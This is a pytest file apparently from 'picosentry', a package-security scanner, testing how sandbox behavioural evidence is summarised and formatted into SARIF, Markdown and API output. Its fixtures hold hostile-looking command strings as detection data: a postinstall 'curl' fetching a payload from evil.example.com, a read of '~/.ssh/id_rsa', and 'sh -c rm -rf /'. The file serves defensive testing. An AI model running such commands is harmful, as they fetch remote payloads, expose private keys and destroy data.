from __future__ import annotations

import json

from picosentry._core.models import Severity
from picosentry.sandbox.l4.models import (
    AnalysisResult,
    BehavioralProfile,
    BehavioralVerdict,
    DnsQuery,
    DriftResult,
    FileOperation,
    NetworkCall,
    ProcessSpawn,
    TimingPoint,
)
from picosentry.sandbox.models import SandboxFinding
from picosentry.scan.formatters.markdown import format_markdown
from picosentry.scan.formatters.sarif import format_sarif
from picosentry.scan.models import ScanResult, ScanStats

try:
    from picosentry.serve.api.models import BehavioralEvidenceItem, BehavioralEvidenceSummary
except ImportError:
    BehavioralEvidenceItem = None
    BehavioralEvidenceSummary = None

import pytest

requires_serve = pytest.mark.skipif(
    BehavioralEvidenceItem is None,
    reason="serve extras not installed",
)


def _make_scan_result(behavioral_evidence=None, findings=None):
    return ScanResult(
        target="/tmp/test",
        engine_version="2.0.18",
        corpus_version="abc123",
        findings=findings or [],
        stats=ScanStats(packages_scanned=1, files_scanned=10, duration_ms=100),
        behavioral_evidence=behavioral_evidence,
    )


def _make_analysis_result():
    return AnalysisResult(
        target="evil-pkg",
        findings=[
            SandboxFinding(
                rule_id="L4-NET-001",
                severity=Severity.HIGH,
                message="Suspicious network call",
                location="/tmp",
                evidence={"address": "198.51.100.20", "port": 443},
            ),
        ],
        profile=BehavioralProfile(
            package="evil-pkg",
            network_calls=[NetworkCall(address="198.51.100.20", port=443, protocol="tcp")],
            dns_queries=[DnsQuery(hostname="evil.example.com", resolved_ips=["198.51.100.20"])],
            fs_ops=[FileOperation(path="~/.ssh/id_rsa", operation="read")],
            spawns=[ProcessSpawn(executable="curl", args=["https://evil.example.com/payload"])],
            timing_points=[TimingPoint(label="postinstall", elapsed_ms=4200)],
            total_runtime_ms=5000,
            exit_code=1,
            stdout_len=100,
            stderr_len=50,
        ),
        drift_results=[
            DriftResult(
                baseline_name="evil-pkg@1.0.0",
                score=0.87,
                network_drift=True,
                dns_drift=True,
                fs_drift=False,
                spawn_drift=True,
                timing_drift=False,
            ),
        ],
        overall_verdict=BehavioralVerdict.MALICIOUS,
    )


@requires_serve
class TestToEvidenceSummary:
    def test_full_profile(self):
        result = _make_analysis_result()
        summary = result.to_evidence_summary()
        assert summary["verdict"] == "malicious"
        evidence = summary["evidence"]
        assert any(e["type"] == "network" and "198.51.100.20:443" in e["detail"] for e in evidence)
        assert any(e["type"] == "dns" and e["detail"] == "evil.example.com" for e in evidence)
        assert any(e["type"] == "filesystem" and e["detail"] == "~/.ssh/id_rsa" for e in evidence)
        assert any(e["type"] == "process" and "curl" in e["detail"] for e in evidence)
        assert any(e["type"] == "timing" for e in evidence)
        assert summary["network_calls"]
        assert summary["dns_queries"]
        assert summary["filesystem_ops"]
        assert summary["process_spawns"]
        assert summary["timing_points"]
        assert summary["total_runtime_ms"] == 5000
        assert summary["exit_code"] == 1
        assert summary["drift_score"] == 0.87

    def test_clean_profile(self):
        result = AnalysisResult(
            target="safe-pkg",
            overall_verdict=BehavioralVerdict.CLEAN,
        )
        summary = result.to_evidence_summary()
        assert summary["verdict"] == "clean"
        assert summary["evidence"] == []

    def test_no_profile_no_drift(self):
        result = AnalysisResult(
            target="safe-pkg",
            overall_verdict=BehavioralVerdict.CLEAN,
        )
        summary = result.to_evidence_summary()
        assert "network_calls" not in summary
        assert "drift_score" not in summary

    def test_drift_score_from_drift_results(self):
        result = AnalysisResult(
            target="pkg",
            overall_verdict=BehavioralVerdict.SUSPICIOUS,
            drift_results=[DriftResult(baseline_name="x", score=0.42)],
        )
        summary = result.to_evidence_summary()
        assert summary["drift_score"] == 0.42

    def test_spawn_args_joined(self):
        result = AnalysisResult(
            target="pkg",
            overall_verdict=BehavioralVerdict.CLEAN,
            profile=BehavioralProfile(
                package="pkg",
                spawns=[ProcessSpawn(executable="sh", args=["-c", "rm -rf /"])],
            ),
        )
        summary = result.to_evidence_summary()
        proc = [e for e in summary["evidence"] if e["type"] == "process"]
        assert len(proc) == 1
        assert "sh -c rm -rf /" in proc[0]["detail"]


@requires_serve
class TestBehavioralEvidenceSummary:
    def test_model_defaults(self):
        s = BehavioralEvidenceSummary(verdict="clean")
        assert s.verdict == "clean"
        assert s.confidence == 0.0
        assert s.evidence == []
        assert s.drift_score is None

    def test_model_full(self):
        item = BehavioralEvidenceItem(type="network", detail="1.2.3.4:443", trigger="tcp")
        s = BehavioralEvidenceSummary(
            verdict="malicious",
            confidence=0.97,
            evidence=[item],
            network_calls=[{"address": "1.2.3.4", "port": 443}],
            drift_score=0.87,
        )
        assert s.evidence[0].type == "network"
        assert s.evidence[0].detail == "1.2.3.4:443"
        assert s.drift_score == 0.87


@requires_serve
class TestSarifBehavioralEvidence:
    def test_sarif_without_behavioral_evidence(self):
        result = _make_scan_result()
        sarif = json.loads(format_sarif(result))
        run = sarif["runs"][0]
        assert "properties" not in run

    def test_sarif_with_behavioral_evidence(self):
        evidence = {
            "verdict": "malicious",
            "evidence": [
                {"type": "network", "detail": "198.51.100.20:443", "trigger": "tcp"},
                {"type": "filesystem", "detail": "~/.ssh/id_rsa", "trigger": "read"},
            ],
        }
        result = _make_scan_result(behavioral_evidence=evidence)
        sarif = json.loads(format_sarif(result))
        run = sarif["runs"][0]
        assert "properties" in run
        assert run["properties"]["behavioral_evidence"]["verdict"] == "malicious"
        assert len(run["properties"]["behavioral_evidence"]["evidence"]) == 2


@requires_serve
class TestMarkdownBehavioralEvidence:
    def test_markdown_without_behavioral_evidence(self):
        result = _make_scan_result()
        md = format_markdown(result)
        assert "Behavioral Evidence" not in md

    def test_markdown_with_behavioral_evidence(self):
        evidence = {
            "verdict": "malicious",
            "evidence": [
                {"type": "network", "detail": "198.51.100.20:443", "trigger": "postinstall"},
                {"type": "filesystem", "detail": "~/.ssh/id_rsa", "trigger": "read"},
                {"type": "process", "detail": "curl https://evil.example.com/payload", "trigger": "postinstall"},
            ],
        }
        result = _make_scan_result(behavioral_evidence=evidence)
        md = format_markdown(result)
        assert "## Behavioral Evidence" in md
        assert "| network | 198.51.100.20:443 | postinstall |" in md
        assert "| filesystem | ~/.ssh/id_rsa | read |" in md
        assert "| process | curl https://evil.example.com/payload | postinstall |" in md

    def test_markdown_empty_evidence_items(self):
        evidence = {"verdict": "clean", "evidence": []}
        result = _make_scan_result(behavioral_evidence=evidence)
        md = format_markdown(result)
        assert "Behavioral Evidence" not in md


@requires_serve
class TestApiResponseBehavioralEvidence:
    def test_scan_response_without_behavioral_evidence(self):
        from picosentry.serve.api.models import ScanResponse

        resp = ScanResponse(
            scan_id="abc",
            started_at="2025-01-01T00:00:00Z",
            target="/tmp/test",
            engine_version="2.0.18",
            findings_count=0,
            findings=[],
            stats={},
        )
        assert resp.behavioral_evidence is None

    def test_scan_response_with_behavioral_evidence(self):
        from picosentry.serve.api.models import ScanResponse

        evidence = {
            "verdict": "malicious",
            "evidence": [{"type": "network", "detail": "1.2.3.4:443", "trigger": ""}],
        }
        resp = ScanResponse(
            scan_id="abc",
            started_at="2025-01-01T00:00:00Z",
            target="/tmp/test",
            engine_version="2.0.18",
            findings_count=1,
            findings=[{"rule_id": "L4-NET-001", "severity": "HIGH", "message": "test"}],
            stats={},
            behavioral_evidence=evidence,
        )
        assert resp.behavioral_evidence is not None
        assert resp.behavioral_evidence["verdict"] == "malicious"
